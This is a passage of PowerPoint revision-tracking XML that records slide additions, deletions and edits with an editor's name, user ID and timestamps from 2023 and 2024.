        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{265EDE7E-8960-482E-BE3B-AB9358251C6F}" dt="2023-06-14T13:35:13.981" v="4407" actId="14100"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3687114822" sldId="434"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add del mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{265EDE7E-8960-482E-BE3B-AB9358251C6F}" dt="2023-06-14T05:28:57.881" v="3113" actId="2696"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="133882602" sldId="435"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{265EDE7E-8960-482E-BE3B-AB9358251C6F}" dt="2023-06-14T05:29:00.514" v="3114"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1705927042" sldId="435"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{265EDE7E-8960-482E-BE3B-AB9358251C6F}" dt="2023-06-14T11:21:29.728" v="3896" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3837458877" sldId="436"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{265EDE7E-8960-482E-BE3B-AB9358251C6F}" dt="2023-06-14T11:21:44.625" v="3900"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4161819071" sldId="437"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{265EDE7E-8960-482E-BE3B-AB9358251C6F}" dt="2023-06-14T11:21:47.092" v="3901"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3170302261" sldId="438"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add del mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{265EDE7E-8960-482E-BE3B-AB9358251C6F}" dt="2023-06-14T07:25:42.049" v="3602" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3179122372" sldId="439"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{265EDE7E-8960-482E-BE3B-AB9358251C6F}" dt="2023-06-14T13:54:54.235" v="4515" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="776674572" sldId="440"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp modSp add del mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{265EDE7E-8960-482E-BE3B-AB9358251C6F}" dt="2023-06-14T11:21:57.428" v="3904" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2454382323" sldId="441"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{265EDE7E-8960-482E-BE3B-AB9358251C6F}" dt="2023-06-14T09:04:42.231" v="3747" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1819297467" sldId="442"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{265EDE7E-8960-482E-BE3B-AB9358251C6F}" dt="2023-06-14T09:04:43.058" v="3748" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1204747651" sldId="443"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{265EDE7E-8960-482E-BE3B-AB9358251C6F}" dt="2023-06-14T09:04:44.604" v="3749" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="222607015" sldId="444"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{265EDE7E-8960-482E-BE3B-AB9358251C6F}" dt="2023-06-14T09:04:45.082" v="3750" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3455340620" sldId="445"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{265EDE7E-8960-482E-BE3B-AB9358251C6F}" dt="2023-06-14T09:04:46.034" v="3751" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3234261945" sldId="446"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{265EDE7E-8960-482E-BE3B-AB9358251C6F}" dt="2023-06-14T13:35:48.809" v="4410" actId="478"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1532007744" sldId="447"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="delSp modSp add del mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{265EDE7E-8960-482E-BE3B-AB9358251C6F}" dt="2023-06-14T05:28:57.881" v="3113" actId="2696"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1889936334" sldId="447"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{265EDE7E-8960-482E-BE3B-AB9358251C6F}" dt="2023-06-14T11:21:39.537" v="3898"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1592848847" sldId="448"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{265EDE7E-8960-482E-BE3B-AB9358251C6F}" dt="2023-06-14T11:21:42.283" v="3899"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2377860639" sldId="449"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="delSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{265EDE7E-8960-482E-BE3B-AB9358251C6F}" dt="2023-06-14T05:37:27.271" v="3274" actId="5793"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1259852005" sldId="450"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="delSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{265EDE7E-8960-482E-BE3B-AB9358251C6F}" dt="2023-06-14T05:48:38.732" v="3322" actId="5793"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2228856731" sldId="451"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{265EDE7E-8960-482E-BE3B-AB9358251C6F}" dt="2023-06-14T11:21:08.322" v="3866" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2458016184" sldId="452"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{265EDE7E-8960-482E-BE3B-AB9358251C6F}" dt="2023-06-14T11:21:35.704" v="3897"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="514975812" sldId="453"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod ord">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{265EDE7E-8960-482E-BE3B-AB9358251C6F}" dt="2023-06-14T11:20:36.512" v="3839" actId="1076"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1476887883" sldId="454"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="delSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{265EDE7E-8960-482E-BE3B-AB9358251C6F}" dt="2023-06-14T11:20:54.360" v="3846" actId="1076"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="606407850" sldId="455"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="delSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{265EDE7E-8960-482E-BE3B-AB9358251C6F}" dt="2023-06-14T11:52:51.139" v="4313" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4041387428" sldId="456"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{265EDE7E-8960-482E-BE3B-AB9358251C6F}" dt="2023-06-14T11:40:33.959" v="4233" actId="1076"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2931003349" sldId="457"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="delSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{265EDE7E-8960-482E-BE3B-AB9358251C6F}" dt="2023-06-14T11:40:58.754" v="4281" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="668223248" sldId="458"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{265EDE7E-8960-482E-BE3B-AB9358251C6F}" dt="2023-06-14T12:17:18.713" v="4391" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2723117609" sldId="459"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="delSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{265EDE7E-8960-482E-BE3B-AB9358251C6F}" dt="2023-06-14T12:20:06.311" v="4394" actId="478"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2090144454" sldId="460"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{265EDE7E-8960-482E-BE3B-AB9358251C6F}" dt="2023-06-14T13:38:15.540" v="4437" actId="1076"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3830757283" sldId="461"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{265EDE7E-8960-482E-BE3B-AB9358251C6F}" dt="2023-06-14T21:24:56.067" v="4518"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="413582869" sldId="462"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldMasterChg chg="delSldLayout">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{265EDE7E-8960-482E-BE3B-AB9358251C6F}" dt="2023-06-09T11:50:47.695" v="6" actId="47"/>
        <pc:sldMasterMkLst>
          <pc:docMk/>
          <pc:sldMasterMk cId="3530070867" sldId="2147483660"/>
        </pc:sldMasterMkLst>
        <pc:sldLayoutChg chg="del">
          <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{265EDE7E-8960-482E-BE3B-AB9358251C6F}" dt="2023-06-09T11:50:47.695" v="6" actId="47"/>
          <pc:sldLayoutMkLst>
            <pc:docMk/>
            <pc:sldMasterMk cId="3530070867" sldId="2147483660"/>
            <pc:sldLayoutMk cId="2834220525" sldId="2147483670"/>
          </pc:sldLayoutMkLst>
        </pc:sldLayoutChg>
      </pc:sldMasterChg>
    </pc:docChg>
  </pc:docChgLst>
  <pc:docChgLst>
    <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7EED7AF2-00AE-42B1-96DD-0B15C439963F}"/>
    <pc:docChg chg="undo custSel addSld delSld modSld">
      <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7EED7AF2-00AE-42B1-96DD-0B15C439963F}" dt="2024-10-11T16:13:21.092" v="2825" actId="47"/>
      <pc:docMkLst>
        <pc:docMk/>
      </pc:docMkLst>
      <pc:sldChg chg="delSp modSp mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7EED7AF2-00AE-42B1-96DD-0B15C439963F}" dt="2024-09-26T15:38:02.788" v="928" actId="6549"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1661475989" sldId="276"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7EED7AF2-00AE-42B1-96DD-0B15C439963F}" dt="2024-09-26T15:45:01.429" v="953"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1217379116" sldId="285"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7EED7AF2-00AE-42B1-96DD-0B15C439963F}" dt="2024-10-04T17:16:45.165" v="2713" actId="1076"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3857266141" sldId="286"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7EED7AF2-00AE-42B1-96DD-0B15C439963F}" dt="2024-09-24T08:05:34.172" v="30" actId="478"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4196699948" sldId="287"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7EED7AF2-00AE-42B1-96DD-0B15C439963F}" dt="2024-09-20T07:42:31.463" v="1" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="654608868" sldId="376"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7EED7AF2-00AE-42B1-96DD-0B15C439963F}" dt="2024-09-27T15:38:05.429" v="2697" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2525408418" sldId="390"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7EED7AF2-00AE-42B1-96DD-0B15C439963F}" dt="2024-09-24T19:34:39.760" v="234" actId="478"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="388397622" sldId="393"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7EED7AF2-00AE-42B1-96DD-0B15C439963F}" dt="2024-09-25T17:57:00.874" v="684" actId="14100"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="70409061" sldId="395"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7EED7AF2-00AE-42B1-96DD-0B15C439963F}" dt="2024-09-25T09:12:23.696" v="405" actId="14100"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="227195369" sldId="418"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7EED7AF2-00AE-42B1-96DD-0B15C439963F}" dt="2024-09-25T17:57:25.676" v="712" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="743164043" sldId="430"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7EED7AF2-00AE-42B1-96DD-0B15C439963F}" dt="2024-10-04T13:16:38.555" v="2707" actId="13926"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1592848847" sldId="448"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7EED7AF2-00AE-42B1-96DD-0B15C439963F}" dt="2024-10-11T09:19:12.511" v="2787" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2458016184" sldId="452"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7EED7AF2-00AE-42B1-96DD-0B15C439963F}" dt="2024-10-04T13:16:33.863" v="2706" actId="13926"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="514975812" sldId="453"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7EED7AF2-00AE-42B1-96DD-0B15C439963F}" dt="2024-10-04T13:11:30.658" v="2702" actId="1076"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1476887883" sldId="454"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7EED7AF2-00AE-42B1-96DD-0B15C439963F}" dt="2024-10-04T13:12:51.422" v="2705" actId="1076"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="606407850" sldId="455"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7EED7AF2-00AE-42B1-96DD-0B15C439963F}" dt="2024-10-11T09:23:40.031" v="2791" actId="6549"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4041387428" sldId="456"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="delSp modSp mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7EED7AF2-00AE-42B1-96DD-0B15C439963F}" dt="2024-10-11T09:23:32.860" v="2789" actId="6549"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2931003349" sldId="457"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7EED7AF2-00AE-42B1-96DD-0B15C439963F}" dt="2024-10-11T09:23:35.055" v="2790" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="668223248" sldId="458"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7EED7AF2-00AE-42B1-96DD-0B15C439963F}" dt="2024-10-11T09:56:30.730" v="2793" actId="13926"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3830757283" sldId="461"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp del mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7EED7AF2-00AE-42B1-96DD-0B15C439963F}" dt="2024-10-11T16:13:21.092" v="2825" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2469029640" sldId="463"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7EED7AF2-00AE-42B1-96DD-0B15C439963F}" dt="2024-10-11T11:33:21.075" v="2821" actId="13926"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2022026658" sldId="466"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7EED7AF2-00AE-42B1-96DD-0B15C439963F}" dt="2024-10-11T11:22:45.113" v="2820" actId="20578"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2135918341" sldId="467"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7EED7AF2-00AE-42B1-96DD-0B15C439963F}" dt="2024-10-11T11:34:38.106" v="2822" actId="11529"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1205810816" sldId="468"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7EED7AF2-00AE-42B1-96DD-0B15C439963F}" dt="2024-10-11T11:35:49.087" v="2824" actId="13926"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3137595583" sldId="471"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7EED7AF2-00AE-42B1-96DD-0B15C439963F}" dt="2024-09-24T08:06:37.017" v="44" actId="11529"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="765832598" sldId="477"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7EED7AF2-00AE-42B1-96DD-0B15C439963F}" dt="2024-09-26T15:46:02.005" v="965" actId="1076"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1568960941" sldId="478"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7EED7AF2-00AE-42B1-96DD-0B15C439963F}" dt="2024-09-25T08:44:53.626" v="244" actId="12"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4057799405" sldId="479"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7EED7AF2-00AE-42B1-96DD-0B15C439963F}" dt="2024-09-25T09:10:06.057" v="286" actId="478"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1121554648" sldId="480"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="delSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7EED7AF2-00AE-42B1-96DD-0B15C439963F}" dt="2024-09-24T19:34:48.372" v="237" actId="1076"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2418439724" sldId="481"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7EED7AF2-00AE-42B1-96DD-0B15C439963F}" dt="2024-09-25T09:14:10.628" v="425" actId="14100"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3506135627" sldId="482"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7EED7AF2-00AE-42B1-96DD-0B15C439963F}" dt="2024-09-25T09:56:24.402" v="574" actId="478"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1855680757" sldId="483"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="delSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7EED7AF2-00AE-42B1-96DD-0B15C439963F}" dt="2024-09-25T09:56:30.955" v="576" actId="478"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="901312318" sldId="484"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7EED7AF2-00AE-42B1-96DD-0B15C439963F}" dt="2024-09-25T17:57:12.458" v="685"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4169151468" sldId="485"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7EED7AF2-00AE-42B1-96DD-0B15C439963F}" dt="2024-09-26T15:20:44.968" v="903" actId="20577"/>
